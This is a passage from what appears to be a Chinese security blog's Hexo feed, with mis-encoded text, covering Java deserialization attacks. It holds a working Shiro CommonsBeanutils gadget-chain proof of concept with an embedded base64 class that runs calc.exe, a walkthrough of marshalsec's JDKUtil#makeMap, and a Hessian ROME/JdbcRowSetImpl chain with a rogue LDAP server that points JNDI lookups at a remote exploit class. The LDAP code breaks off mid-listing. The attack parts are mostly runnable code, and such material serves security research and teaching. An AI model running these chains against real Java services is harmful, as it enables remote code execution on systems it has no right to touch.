alt="QQæˆªå›¾20220401170407"></p><p><strong>æ€»ç»“:æ„Ÿè§‰ç®€å•çš„ä¸€äº›linuxå‘½ä»¤ã€‚</strong></p><p>æœ€åè¿˜æ˜¯æ²¡æœ‰å­¦ä¼šè‡ªå·±å‡ºï¼Œå»æ‰¾äº†ä¸€äº›æ¨¡æ¿æ”¹äº†æ”¹ã€‚å®‰æ…°ä¸‹è‡ªå·±ï¼Œè‡³å°‘ä¼šä¿®æ”¹åˆ«äººçš„æ¨¡æ¿äº† å“ˆå“ˆå“ˆ~~~    <strong>Â·_Â·</strong></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiroæ— ccé“¾åˆ©ç”¨</title>
    <link href="/2022/03/31/Shiro%E6%97%A0cc%E9%93%BE%E5%88%A9%E7%94%A8/"/>
    <url>/2022/03/31/Shiro%E6%97%A0cc%E9%93%BE%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiroæ— ccé“¾åˆ©ç”¨"><a href="#Shiroæ— ccé“¾åˆ©ç”¨" class="headerlink" title="Shiroæ— ccé“¾åˆ©ç”¨"></a>Shiroæ— ccé“¾åˆ©ç”¨</h1><p>åœ¨å¤ç°çš„æ—¶å€™ï¼Œå‘ç°äº†Shiroçš„ä¾èµ–ä¸­è‡ªå¸¦äº†cb+ccã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957452.png" alt="QQæˆªå›¾20220331181259"></p><p>å¹¶ä¸”è¿™é‡Œå…¶å®å°†shiroçš„è‡ªå¸¦åŒ…ä¸­çš„ccä¾èµ–åˆ é™¤ï¼Œä¾æ—§ä¼šå­˜åœ¨cbé“¾ã€‚<br>è¿™é‡Œå¯ä»¥è¯•ç€æŠŠccä¾èµ–åˆ é™¤ï¼Œé‡æ–°mavenã€‚<br>ä½¿ç”¨cbé“¾æ¥æ‰“ä¸€ä¸‹ã€‚å‘ç°æŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957776.png" alt="QQæˆªå›¾20220331192500"></p><p>å¯ä»¥è·Ÿè¿›å»çœ‹ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957086.png" alt="QQæˆªå›¾20220331192638"></p><p>åœ¨æˆ‘ä»¬çš„cbæ„é€ é“¾ä¸­</p><p><code>BeanComparator beanComparator = new BeanComparator();</code></p><p>æ²¡æœ‰èµ‹åˆå€¼ï¼Œé‚£ä¹ˆå°±ä¼šé»˜è®¤è°ƒç”¨ccé“¾ï¼Œä½†æ˜¯ccé“¾åˆè¢«åˆ äº†ã€‚</p><h2 id="ç ´å±€"><a href="#ç ´å±€" class="headerlink" title="ç ´å±€"></a>ç ´å±€</h2><p>å°±æ˜¯æ‰¾ä¸€ä¸ªshiroè‡ªå¸¦ç±»å®ç°äº†ä¸ä¸Šè¿°ç±»çš„åŒæ ·åŠŸèƒ½ã€‚<br>éšåæ‰¾åˆ°è¿™æ ·ä¸€ä¸ªç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957469.png" alt="QQæˆªå›¾20220331194501"></p><ul><li>å®ç° java.util.Comparator æ¥å£</li><li>å®ç° java.io.Serializable æ¥å£</li><li>Javaè‡ªå¸¦</li></ul><p>é‚£ä¹ˆå°±è½»æ¾å®Œæˆäº†shiroä¸éœ€è¦ccé“¾ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.shiro.test;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,  ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,<br>                String.CASE_INSENSITIVE_ORDER);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDKUtil#makeMap</title>
    <link href="/2022/03/30/JDKUtil-makeMap/"/>
    <url>/2022/03/30/JDKUtil-makeMap/</url>
    
    <content type="html"><![CDATA[<h1 id="JDKUtil-makeMap"><a href="#JDKUtil-makeMap" class="headerlink" title="JDKUtil#makeMap"></a>JDKUtil#makeMap</h1><p>marshalsecåŒ…é‡Œçš„è¿™ä¸ªä¸œè¥¿åˆ°åº•å¹²äº†ä»€ä¹ˆï¼Ÿ<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301639474.png" alt="QQæˆªå›¾20220330161743"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; s = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>(); <span class="hljs-comment">//åˆ›å»ºhashmapå¯¹è±¡</span><br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301639699.png" alt="QQæˆªå›¾20220330161937"></p><p>é€šè¿‡åå°„å°†HashMapé•¿åº¦è®¾ç½®ä¸º2ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var6) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·å–äº†è·å–<code>java.util.HashMap$Node</code>æˆ–è€…<code>java.util.HashMap$Entry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);<br>      nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”è®¾ç½®é•¿åº¦ä¸º2ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªæ•°æ®æ’å…¥å€¼ä¸º<code>java.util.HashMap$Node</code>æˆ–<code>java.util.HashMap$Entry</code>çš„å®ä¾‹åŒ–å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure><p>è¯¥å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼ é€’4ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªå€¼ä¸º0ï¼Œç¬¬äºŒå’Œä¸‰ä¸ªå€¼ä¸ºåˆšåˆšè·å–å¹¶ä¼ é€’è¿›æ¥çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œç¬¬å››ä¸ªä¸ºnullã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reflections.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><p>åå°„ä¿®æ”¹å€¼ã€‚</p><h2 id="æ˜ç™½ä¹‹å‰çš„å›°æƒ‘"><a href="#æ˜ç™½ä¹‹å‰çš„å›°æƒ‘" class="headerlink" title="æ˜ç™½ä¹‹å‰çš„å›°æƒ‘"></a>æ˜ç™½ä¹‹å‰çš„å›°æƒ‘</h2><p>è¿™ä¹ˆä¸€æ¥å°±æ‡‚äº†ï¼Œè¿™é‡Œå¦‚æœä»¬ç›´æ¥ä¼ å…¥**hashMap(root,root)**ï¼Œä¼šç›´æ¥è°ƒç”¨<code>hashMap#hash</code>,å¹¶ä¸”è¿™é‡Œæˆ‘ä»¬å·²ç»ä¼ å…¥äº†å‚æ•°ï¼Œå°±ä¼šç›´æ¥è°ƒç”¨    <code>EqualsBean#beanHashCode</code>ï¼Œæ‰€ä»¥è¿™æ ·æˆ‘ä»¬å°±ç›´æ¥å½¢æˆäº†è°ƒç”¨é“¾ã€‚</p><p>ä½†æ˜¯è¿™é‡Œé€šè¿‡äº†åå°„èµ‹å€¼ï¼Œå¼€å§‹ä¸ºç©ºï¼Œåœ¨è°ƒç”¨ä¹‹åèµ‹å€¼ï¼Œå°±æ˜ç™½äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessianï¼ˆROME+JDBCï¼‰</title>
    <link href="/2022/03/30/Hessian%EF%BC%88ROME-JDBC%EF%BC%89/"/>
    <url>/2022/03/30/Hessian%EF%BC%88ROME-JDBC%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian-ROME-JDBC"><a href="#Hessian-ROME-JDBC" class="headerlink" title="Hessian(ROME+JDBC)"></a>Hessian(ROME+JDBC)</h1><p>è¿™ä¸ªå°±å¾ˆç®€å•ï¼Œä¸€æ ·åŸç†ã€‚</p><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">hessianInput.readObject();<br>HashMap.hash<br>HashMap.putVal<br>HashMap.put<br>EqualsBean.beanHashCode<br>EqualsBean.hashCode<br><br>ToStringBean.toString<br>EqualsBean.beanHashCode<br>        <br>ToStringBean.toString()<br>        JdbcRowSetImpl.getDatabaseMetaData<br>JdbcRowSetImpl.connect<br>Context.lookup<br><br></code></pre></td></tr></table></figure><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>marshalsecçš„åŒ…</li><li>ldapç¯å¢ƒï¼ˆfastjsonçš„jdbcæœ‰ï¼‰</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:80/#Exploit&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span 